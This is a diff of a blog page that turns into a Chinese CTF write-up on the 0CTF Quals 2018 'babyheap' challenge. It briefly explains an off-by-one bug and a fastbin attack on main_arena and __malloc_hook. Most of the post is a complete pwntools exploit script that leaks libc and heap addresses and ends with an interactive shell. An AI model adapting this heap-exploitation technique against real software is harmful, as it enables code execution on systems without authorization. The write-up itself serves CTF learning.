@@ -98,20 +98,25 @@
 
 
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/tags/libc/index.html">
+  <meta name="description" content="0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。">
+<meta name="keywords" content="ctf,pwn,2019">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 Mar pwn writeup">
+<meta property="og:url" content="https://sunichi.github.io/2019/03/12/19-Mar/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-12T07:40:00.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="2019 Mar pwn writeup">
+<meta name="twitter:description" content="0CTF Quals 2018 babyheap [2019.03.12]一道挺有趣的fast bin做法的题。">
 
 
 
 
 
 
-  <link rel="canonical" href="https://sunichi.github.io/tags/libc/"/>
+  <link rel="canonical" href="https://sunichi.github.io/2019/03/12/19-Mar/"/>
 
 
 
@@ -121,7 +126,7 @@
   };
 </script>
 
-  <title>标签: libc | Sunichi's Blog</title>
+  <title>2019 Mar pwn writeup | Sunichi's Blog</title>
   
 
 
@@ -169,7 +174,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -258,19 +263,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -318,87 +310,178 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>libc<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/03/12/19-Mar/"/>
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sunichi"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunichi's Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/2018/11/16/hctf18-easyexp/" itemprop="url">
-            
-              <span itemprop="name">CVE–2018-1000001 & hctf 2018 easyexp</span>
-            
-          </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">2019 Mar pwn writeup
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-11-16T23:09:00+08:00"
-              content="2018-11-16">
-          11-16
-        </time>
-      </div>
+              
+            
+          </h1>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
+          <span class="post-time">
 
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-12 15:40:00" itemprop="dateCreated datePublished" datetime="2019-03-12T15:40:00+08:00">2019-03-12</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-          <a class="post-title-link" href="/2018/06/04/ptmalloc-malloc_consolidate/" itemprop="url">
-            
-              <span itemprop="name">ptmalloc malloc_consolidate分析</span>
-            
-          </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-06-04T20:50:00+08:00"
-              content="2018-06-04">
-          06-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h2 id="0CTF-Quals-2018-babyheap-2019-03-12"><a href="#0CTF-Quals-2018-babyheap-2019-03-12" class="headerlink" title="0CTF Quals 2018 babyheap [2019.03.12]"></a>0CTF Quals 2018 babyheap [2019.03.12]</h2><p>一道挺有趣的fast bin做法的题。</p>
+<a id="more"></a>
+<p>漏洞为<code>off-by-one</code>。一开始想利用FSOP来getshell，但是由于程序申请的chunk的大小的限制，无法将chunk从unsorted bin放入smallbin[4]。</p>
+<p>由于程序允许的chunk大小范围时0x20-0x50，因此可以利用堆地址的0x55/0x56来获取<code>main_arena</code>处的空间，进而修改<code>top_chunk</code>指针到<code>malloc_hook</code>附近劫持<code>malloc_hook</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(p, idx, content, attack=<span class="number">0</span>, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> attack == <span class="number">0</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>, str(len(content)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command: '</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    BIN_PATH = <span class="string">'./program'</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">            <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">                libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">    update(p, <span class="number">0</span>, <span class="string">'\x00'</span> * <span class="number">0x28</span> + <span class="string">'\x91'</span>, <span class="number">1</span>, <span class="number">0x29</span>)</span><br><span class="line">    update(p, <span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#1</span></span><br><span class="line">    view(p, <span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'k[2]: '</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7f4675a13b78</span> - <span class="number">0x00007f467564f000</span>)</span><br><span class="line">    log.info(<span class="string">'libc:%s'</span> % hex(libc.address))</span><br><span class="line">    update(p, <span class="number">2</span>, recv * <span class="number">2</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    update(p, <span class="number">0</span>, <span class="string">'\x00'</span> * <span class="number">0x28</span> + <span class="string">'\x91'</span>, <span class="number">1</span>, <span class="number">0x29</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    view(p, <span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'k[2]: '</span>)</span><br><span class="line">    p.recv(<span class="number">8</span>)</span><br><span class="line">    heap = p.recv(<span class="number">8</span>)</span><br><span class="line">    heap_addr = u64(heap) - <span class="number">0x60</span></span><br><span class="line">    log.info(<span class="string">'heap base:%s'</span> % hex(heap_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clear the heap</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">    update(p, <span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x20</span>))</span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#4</span></span><br><span class="line">    update(p, <span class="number">3</span>, <span class="string">'\x00'</span> * <span class="number">0x58</span> + <span class="string">'\x51'</span>, <span class="number">1</span>, <span class="number">0x59</span>)</span><br><span class="line">    <span class="comment"># chunk overlap to fast bin attack</span></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    update(p, <span class="number">4</span>, p64(libc.address + (<span class="number">0x7f7aaf721b2d</span> - <span class="number">0x00007f7aaf35d000</span>)))</span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#2 main_arena</span></span><br><span class="line">    payload = <span class="string">'\x00\x00\x00'</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>)</span><br><span class="line">    update(p, <span class="number">2</span>, payload)</span><br><span class="line">    add(p, <span class="number">0x38</span>) </span><br><span class="line">    payload = <span class="string">'\x00\x00\x00'</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc.address + <span class="number">0xf02a4</span>)</span><br><span class="line">    update(p, <span class="number">5</span>, payload)</span><br><span class="line">    <span class="comment"># getshell</span></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line"><span class="comment">#    gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
 
       
     </div>
 
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/2019/" rel="tag"># 2019</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/11/Learn-LargeBin-With-Heapstorm2/" rel="next" title="Learn Large Bin With 0ctf2018 Heapstorm2">
+                <i class="fa fa-chevron-left"></i> Learn Large Bin With 0ctf2018 Heapstorm2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -418,8 +501,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -542,6 +634,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0CTF-Quals-2018-babyheap-2019-03-12"><span class="nav-number">1.</span> <span class="nav-text">0CTF Quals 2018 babyheap [2019.03.12]</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
@@ -670,6 +779,10 @@
 
 
   
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
 
   
 
@@ -685,6 +798,8 @@
 
   
 
+
+  
 
 
   
